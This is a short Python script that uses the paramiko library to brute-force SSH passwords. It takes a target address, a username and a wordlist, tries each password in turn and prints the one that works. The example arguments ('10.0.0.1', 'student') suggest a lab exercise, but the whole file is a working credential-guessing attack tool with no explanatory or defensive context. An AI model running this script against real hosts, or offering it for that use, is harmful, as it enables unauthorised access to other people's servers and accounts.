import paramiko
import sys

target = sys.argv[1]         # e.g., "10.0.0.1"
username = sys.argv[2]       # e.g., "student"
wordlist_path = sys.argv[3]  # e.g., "passwords.txt"

# Load wordlist
with open(wordlist_path, 'r', encoding='latin-1') as file:
    passwords = file.readlines()

# Strip newline characters
passwords = [p.strip() for p in passwords]

print("Trying to brute-force...")
for password in passwords:
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target, username=username, password=password, timeout=3)
        print(f"Success! Username: {username} Password: {password}")
        ssh.close()
        break
    except paramiko.AuthenticationException:
        continue
    except Exception as e:
        print(f"Error: {e}")
        break

